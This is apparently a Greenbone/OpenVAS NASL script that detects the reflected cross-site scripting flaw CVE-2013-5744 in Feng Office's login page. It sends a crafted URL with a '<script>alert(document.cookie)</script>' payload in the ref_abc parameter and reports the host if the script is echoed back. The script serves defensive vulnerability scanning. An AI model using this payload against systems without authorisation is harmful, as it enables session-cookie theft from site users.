CPE = "cpe:/a:fengoffice:feng_office";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803959" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2013-5744" );
	script_bugtraq_id( 62591 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2013-11-05 18:42:22 +0530 (Tue, 05 Nov 2013)" );
	script_name( "Feng Office ref_XXX XSS Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_feng_office_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "FengOffice/installed" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2013/Oct/33" );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23174" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/123556" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to steal the victim's
  cookie-based authentication credentials." );
	script_tag( name: "affected", value: "Feng Office 2.3.2-rc and earlier" );
	script_tag( name: "insight", value: "An error exists in the application which fails to properly sanitize user-supplied
  input to 'ref_XXX' parameter before using it" );
	script_tag( name: "solution", value: "Upgrade to Feng Office 2.5-beta or later." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it is able to
  read the string or not." );
	script_tag( name: "summary", value: "This host is installed with Feng Office and is prone to cross-site scripting
  Vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.fengoffice.com" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/index.php?c=access&a=login&ref_abc=\"><script>alert(document.cookie);</script>";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\);</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

